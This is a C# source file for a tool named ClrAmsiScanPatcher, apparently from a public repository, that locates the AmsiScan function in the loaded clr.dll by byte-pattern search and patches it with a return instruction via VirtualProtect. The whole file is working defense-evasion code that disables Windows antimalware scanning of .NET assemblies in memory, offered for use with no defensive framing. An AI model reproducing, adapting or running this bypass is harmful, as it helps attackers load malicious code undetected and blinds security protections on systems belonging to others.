using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace ClrAmsiScanPatcher
{
    public class AmsiPatcher
    {
        /*
         Derived from source code of ClrAmsiScanPatcher, which is
         Copyright (c) 2025 backdoorskid and which is governed
         by the MIT License.

         Modifications and additions to the original source code (contained in this file)
         and all other portions of this file are Copyright (c) 2025 backdoorskid
         and are governed by the MIT License the full text of which is
         contained in the file LICENSE included in the ClrAmsiScanPatcher repository
         and distribution packages.

         Project repository: https://github.com/backdoorskid/ClrAmsiScanPatcher/
        */

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        private byte[] Buffer;
        private ProcessModule clrModule;

        public bool Initialize()
        {
            clrModule = GetClrProcessModule();
            if (clrModule == null)
            {
                Console.WriteLine("[-] Failed to find 'clr.dll' process module");
                return false;
            }
            Console.WriteLine("[+] Found 'clr.dll' process module");

            ReadProcessModuleToBuffer(clrModule);
            Console.WriteLine("[+] Read {0} bytes from 'clr.dll'\n", Buffer.Length);

            return true;
        }

        private ProcessModule GetClrProcessModule()
        {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName == "clr.dll")
                {
                    return module;
                }
            }
            return null;
        }

        private void ReadProcessModuleToBuffer(ProcessModule clrModule)
        {
            Buffer = new byte[clrModule.ModuleMemorySize];
            Marshal.Copy(clrModule.BaseAddress, Buffer, 0, Buffer.Length);
        }

        private int FindDotNetStringOffset()
        {
            byte[] dotNetStringBytes = Encoding.Unicode.GetBytes("DotNet");

            for (int i = 0; i < Buffer.Length; i++)
            {
                bool success = true;
                for (int j = 0; j < dotNetStringBytes.Length; j++)
                {
                    if (Buffer[i + j] != dotNetStringBytes[j])
                    {
                        success = false;
                        break;
                    }
                }

                if (success)
                    return i;
            }

            return 0;
        }

        private int FindInstructionOffset(int dotNetStringOffset)
        {
            if (IntPtr.Size == 4)
            {
                byte[] pushInstruction = new byte[4] { 0x51, 0x68, 0x00, 0x00 };
                BitConverter.GetBytes(dotNetStringOffset).Take(2).ToArray().CopyTo(pushInstruction, 2);

                for (int i = dotNetStringOffset; i >= 0; i--)
                {
                    bool success = true;
                    for (int j = 0; j < 4; j++)
                    {
                        if (Buffer[i + j] != pushInstruction[j])
                        {
                            success = false;
                            break;
                        }
                    }
                    if (success) return i;
                }
            }
            else
            {
                for (int i = dotNetStringOffset; i >= 0; i--)
                {
                    byte[] leaInstruction = new byte[7] { 0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00 };
                    BitConverter.GetBytes(dotNetStringOffset - i - 7).CopyTo(leaInstruction, 3);

                    bool success = true;
                    for (int j = 0; j < 7; j++)
                    {
                        if (Buffer[i + j] != leaInstruction[j])
                        {
                            success = false;
                            break;
                        }
                    }
                    if (success) return i;
                }
            }

            return 0;
        }

        private int FindAmsiScanFunctionOffset(int instructionOffset)
        {
            byte[] functionStartBytes = IntPtr.Size == 4 ? new byte[] { 0xCC, 0x6A, 0x24 } : new byte[] { 0xCC, 0x48, 0x89 };

            for (int i = instructionOffset; i >= 0; i--)
            {
                if (Buffer[i - 1] == functionStartBytes[0] && Buffer[i] == functionStartBytes[1] && Buffer[i + 1] == functionStartBytes[2])
                    return i;
            }

            return 0;
        }

        private bool PatchAmsiScanFunction(IntPtr amsiScanFunctionAddress)
        {
            byte[] patchBytes = new byte[] { 0xC3 };

            uint oldProtect = 0;
            if (VirtualProtect(amsiScanFunctionAddress, (uint)patchBytes.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patchBytes, 0, amsiScanFunctionAddress, patchBytes.Length);
                VirtualProtect(amsiScanFunctionAddress, (uint)patchBytes.Length, oldProtect, out oldProtect);
                return true;
            }
            return false;
        }

        public bool Patch()
        {
            int dotNetStringOffset = FindDotNetStringOffset();
            if (dotNetStringOffset == 0)
            {
                Console.WriteLine("[-] Failed to find 'DotNet' string offset");
                return false;
            }
            Console.WriteLine("[+] Found offset of 'DotNet' string:    " + dotNetStringOffset.ToString("X"));

            int instructionOffset = FindInstructionOffset(dotNetStringOffset);
            if (instructionOffset == 0)
            {
                Console.WriteLine("[-] Failed to find instruction offset");
                return false;
            }
            Console.WriteLine("[+] Found instruction offset:           " + instructionOffset.ToString("X"));

            int amsiScanFunctionOffset = FindAmsiScanFunctionOffset(instructionOffset);
            if (amsiScanFunctionOffset == 0)
            {
                Console.WriteLine("[-] Failed to find AmsiScan function offset");
                return false;
            }

            IntPtr amsiScanFunctionAddress = clrModule.BaseAddress + amsiScanFunctionOffset;
            Console.WriteLine("[+] Found AmsiScan function address:    " + amsiScanFunctionAddress.ToString("X") + "\n");

            if (PatchAmsiScanFunction(amsiScanFunctionAddress))
            {
                Console.WriteLine("[+] Successfully patched AmsiScan");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Failed to patch AmsiScan");
                return false;
            }
        }
    }
}
